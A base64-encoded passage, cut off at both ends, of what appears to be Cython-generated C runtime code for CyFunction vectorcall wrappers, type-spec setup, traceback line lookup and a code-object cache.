CBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKVxue1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYztcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7XG4gICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDtcbiNlbmRpZlxuICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkge1xuICAgIGNhc2UgMTpcbiAgICAgICAgc2VsZiA9IGFyZ3NbMF07XG4gICAgICAgIGFyZ3MgKz0gMTtcbiAgICAgICAgbmFyZ3MgLT0gMTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSAwOlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShuYXJncyAhPSAxKSkge1xuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgZXhhY3RseSBvbmUgYXJndW1lbnQiLCBuYXJncyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gbWV0aChzZWxmLCBhcmdzWzBdKTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4gICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpO1xuICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7XG4jZW5kaWZcbiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywgTlVMTCkpIHtcbiAgICBjYXNlIDE6XG4gICAgICAgIHNlbGYgPSBhcmdzWzBdO1xuICAgICAgICBhcmdzICs9IDE7XG4gICAgICAgIG5hcmdzIC09IDE7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgMDpcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gKChfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4gICAgUHlUeXBlT2JqZWN0ICpjbHMgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooY3lmdW5jKTtcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7XG4gICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDtcbiNlbmRpZlxuICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBOVUxMKSkge1xuICAgIGNhc2UgMTpcbiAgICAgICAgc2VsZiA9IGFyZ3NbMF07XG4gICAgICAgIGFyZ3MgKz0gMTtcbiAgICAgICAgbmFyZ3MgLT0gMTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSAwOlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZTAwQTZcbiAgICBzaXplX3QgbmFyZ3NfdmFsdWUgPSAoc2l6ZV90KSBuYXJncztcbiAgICAjZWxzZVxuICAgIFB5X3NzaXplX3QgbmFyZ3NfdmFsdWUgPSBuYXJncztcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gKChfX1B5eF9QeUNNZXRob2QpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgY2xzLCBhcmdzLCBuYXJnc192YWx1ZSwga3duYW1lcyk7XG59XG4jZW5kaWZcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zbG90c1tdID0ge1xuICAgIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fZGVhbGxvY30sXG4gICAge1B5X3RwX3JlcHIsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9yZXByfSxcbiAgICB7UHlfdHBfY2FsbCwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX0NhbGxBc01ldGhvZH0sXG4gICAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fdHJhdmVyc2V9LFxuICAgIHtQeV90cF9jbGVhciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyfSxcbiAgICB7UHlfdHBfbWV0aG9kcywgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX21ldGhvZHN9LFxuICAgIHtQeV90cF9tZW1iZXJzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc30sXG4gICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX2dldHNldHN9LFxuICAgIHtQeV90cF9kZXNjcl9nZXQsICh2b2lkICopX19QeXhfUHlNZXRob2RfTmV3fSxcbiAgICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0N5RnVuY3Rpb25UeXBlX3NwZWMgPSB7XG4gICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJjeXRob25fZnVuY3Rpb25fb3JfbWV0aG9kIixcbiAgICBzaXplb2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCksXG4gICAgMCxcbiNpZmRlZiBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SXG4gICAgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUiB8XG4jZW5kaWZcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuI2lmIGRlZmluZWQoUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpXG4gICAgUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwgfFxuI2VsaWYgZGVmaW5lZChfUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpXG4gICAgX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMIHxcbiNlbmRpZlxuI2VuZGlmIC8vIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X1RQRkxBR1NfTUFOQUdFRF9ESUNUIHxcbiNlbmRpZlxuICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8IFB5X1RQRkxBR1NfRElTQUxMT1dfSU5TVEFOVElBVElPTiB8XG4gICAgUHlfVFBGTEFHU19ERUZBVUxUIHwgUHlfVFBGTEFHU19IQVZFX0dDIHwgUHlfVFBGTEFHU19CQVNFVFlQRSxcbiAgICBfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zbG90c1xufTtcbnN0YXRpYyBpbnQgX19weXhfQ3lGdW5jdGlvbl9pbml0KFB5T2JqZWN0ICptb2R1bGUpIHtcbiAgICBfX3B5eF9tc3RhdGV0eXBlICptc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtb2R1bGUpO1xuICAgIG1zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhcbiAgICAgICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUsIG1vZHVsZSwgJl9fcHl4X0N5RnVuY3Rpb25UeXBlX3NwZWMsIE5VTEwpO1xuICAgIGlmICh1bmxpa2VseShtc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlID09IE5VTEwpKSB7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0RGVmYXVsdHMoUHlPYmplY3QgKmZ1bmMsIFB5VHlwZU9iamVjdCAqZGVmYXVsdHNfdHlwZSkge1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuICAgIG0tPmRlZmF1bHRzID0gUHlPYmplY3RfQ2FsbE9iamVjdCgoUHlPYmplY3QqKWRlZmF1bHRzX3R5cGUsIE5VTEwpOyAvLyBfUHlPYmplY3RfTmV3KGRlZmF1bHRzX3R5cGUpO1xuICAgIGlmICh1bmxpa2VseSghbS0+ZGVmYXVsdHMpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gbS0+ZGVmYXVsdHM7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnR1cGxlKSB7XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7XG4gICAgbS0+ZGVmYXVsdHNfdHVwbGUgPSB0dXBsZTtcbiAgICBQeV9JTkNSRUYodHVwbGUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzS3dEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqZGljdCkge1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuICAgIG0tPmRlZmF1bHRzX2t3ZGljdCA9IGRpY3Q7XG4gICAgUHlfSU5DUkVGKGRpY3QpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiAgICBtLT5mdW5jX2Fubm90YXRpb25zID0gZGljdDtcbiAgICBQeV9JTkNSRUYoZGljdCk7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX05ldyhQeU1ldGhvZERlZiAqbWwsIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7XG4gICAgUHlPYmplY3QgKm9wID0gX19QeXhfQ3lGdW5jdGlvbl9Jbml0KFxuICAgICAgICBQeU9iamVjdF9HQ19OZXcoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUpLFxuICAgICAgICBtbCwgZmxhZ3MsIHF1YWxuYW1lLCBjbG9zdXJlLCBtb2R1bGUsIGdsb2JhbHMsIGNvZGVcbiAgICApO1xuICAgIGlmIChsaWtlbHkob3ApKSB7XG4gICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKG9wKTtcbiAgICB9XG4gICAgcmV0dXJuIG9wO1xufVxuXG5cbiNpZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLICYmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiNkZWZpbmUgX19QeXhfUHlQcm9iYWJseU1vZHVsZV9HZXREaWN0KG8pIF9fUHl4X1hOZXdSZWYoUHlNb2R1bGVfR2V0RGljdChvKSlcbiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiNkZWZpbmUgX19QeXhfUHlQcm9iYWJseU1vZHVsZV9HZXREaWN0KG8pIFB5T2JqZWN0X0dlbmVyaWNHZXREaWN0KG8sIE5VTEwpO1xuI2Vsc2VcblB5T2JqZWN0KiBfX1B5eF9QeVByb2JhYmx5TW9kdWxlX0dldERpY3QoUHlPYmplY3QgKm8pIHtcbiAgICBQeU9iamVjdCAqKmRpY3RfcHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIobyk7XG4gICAgcmV0dXJuIGRpY3RfcHRyID8gX19QeXhfWE5ld1JlZigqZGljdF9wdHIpIDogTlVMTDtcbn1cbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpIHtcbiAgICBQeU9iamVjdCAqdXNlX2NsaW5lID0gTlVMTDtcbiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrO1xuICAgIFB5T2JqZWN0ICpjeXRob25fcnVudGltZV9kaWN0O1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHRzdGF0ZSk7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSkpIHtcbiAgICAgICAgcmV0dXJuIGNfbGluZTtcbiAgICB9XG4gICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7XG4gICAgY3l0aG9uX3J1bnRpbWVfZGljdCA9IF9fUHl4X1B5UHJvYmFibHlNb2R1bGVfR2V0RGljdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSk7XG4gICAgaWYgKGxpa2VseShjeXRob25fcnVudGltZV9kaWN0KSkge1xuICAgICAgICBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChcbiAgICAgICAgICAgIHVzZV9jbGluZSwgY3l0aG9uX3J1bnRpbWVfZGljdCxcbiAgICAgICAgICAgIF9fUHl4X1B5RGljdF9TZXREZWZhdWx0KGN5dGhvbl9ydW50aW1lX2RpY3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2ssIFB5X0ZhbHNlKSlcbiAgICB9XG4gICAgaWYgKHVzZV9jbGluZSA9PSBOVUxMIHx8IHVzZV9jbGluZSA9PSBQeV9GYWxzZSB8fCAodXNlX2NsaW5lICE9IFB5X1RydWUgJiYgUHlPYmplY3RfTm90KHVzZV9jbGluZSkgIT0gMCkpIHtcbiAgICAgICAgY19saW5lID0gMDtcbiAgICB9XG4gICAgUHlfWERFQ1JFRih1c2VfY2xpbmUpO1xuICAgIFB5X1hERUNSRUYoY3l0aG9uX3J1bnRpbWVfZGljdCk7XG4gICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTtcbiAgICByZXR1cm4gY19saW5lO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpIHtcbiAgICBpbnQgc3RhcnQgPSAwLCBtaWQgPSAwLCBlbmQgPSBjb3VudCAtIDE7XG4gICAgaWYgKGVuZCA+PSAwICYmIGNvZGVfbGluZSA+IGVudHJpZXNbZW5kXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgcmV0dXJuIGNvdW50O1xuICAgIH1cbiAgICB3aGlsZSAoc3RhcnQgPCBlbmQpIHtcbiAgICAgICAgbWlkID0gc3RhcnQgKyAoZW5kIC0gc3RhcnQpIC8gMjtcbiAgICAgICAgaWYgKGNvZGVfbGluZSA8IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgICAgIGVuZCA9IG1pZDtcbiAgICAgICAgfSBlbHNlIGlmIChjb2RlX2xpbmUgPiBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7XG4gICAgICAgICAgICAgc3RhcnQgPSBtaWQgKyAxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIG1pZDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBpZiAoY29kZV9saW5lIDw9IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgcmV0dXJuIG1pZDtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gbWlkICsgMTtcbiAgICB9XG59XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X19maW5kX2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUpIHtcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3Q7XG4gICAgaW50IHBvcztcbiAgICBpZiAodW5saWtlbHkoIWNvZGVfbGluZSkgfHwgdW5saWtlbHkoIWNvZGVfY2FjaGUtPmVudHJpZXMpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpO1xuICAgIGlmICh1bmxpa2VseShwb3MgPj0gY29kZV9jYWNoZS0+Y291bnQpIHx8IHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgIT0gY29kZV9saW5lKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgY29kZV9vYmplY3QgPSBjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9vYmplY3Q7XG4gICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTtcbiAgICByZXR1cm4gY29kZV9vYmplY3Q7XG59XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDU1xuICAgICh2b2lkKV9fcHl4X19maW5kX2NvZGVfb2JqZWN0O1xuICAgIHJldHVybiBOVUxMOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvblwndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IG1pc3MuXG4jZWxzZVxuICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGRfY291bnQgPSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCk7XG4gICAgaWYgKG9sZF9jb3VudCA8IDApIHtcbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqcmVzdWx0ID0gX19weXhfX2ZpbmRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTtcbiNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cbnN0YXRpYyB2b2lkIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Qoc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSwgaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KVxue1xuICAgIGludCBwb3MsIGk7XG4gICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMgPSBjb2RlX2NhY2hlLT5lbnRyaWVzO1xuICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSkge1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHtcbiAgICAgICAgZW50cmllcyA9IChfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSopUHlNZW1fTWFsbG9jKDY0KnNpemVvZihfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSkpO1xuICAgICAgICBpZiAobGlrZWx5KGVudHJpZXMpKSB7XG4gICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllcztcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPm1heF9jb3VudCA9IDY0O1xuICAgICAgICAgICAgY29kZV9jYWNoZS0+Y291bnQgPSAxO1xuICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7XG4gICAgICAgICAgICBlbnRyaWVzWzBdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgICAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgcG9zID0gX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhjb2RlX2NhY2hlLT5lbnRyaWVzLCBjb2RlX2NhY2hlLT5jb3VudCwgY29kZV9saW5lKTtcbiAgICBpZiAoKHBvcyA8IGNvZGVfY2FjaGUtPmNvdW50KSAmJiB1bmxpa2VseShjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9saW5lID09IGNvZGVfbGluZSkpIHtcbiAgICAgICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIHRtcCA9IGVudHJpZXNbcG9zXS5jb2RlX29iamVjdDtcbiAgICAgICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7XG4gICAgICAgIFB5X0RFQ1JFRih0bXApO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmIChjb2RlX2NhY2hlLT5jb3VudCA9PSBjb2RlX2NhY2hlLT5tYXhfY291bnQpIHtcbiAgICAgICAgaW50IG5ld19tYXggPSBjb2RlX2NhY2hlLT5tYXhfY291bnQgKyA2NDtcbiAgICAgICAgZW50cmllcyA9IChfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSopUHlNZW1fUmVhbGxvYyhcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMsICgoc2l6ZV90KW5ld19tYXgpICogc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICBjb2RlX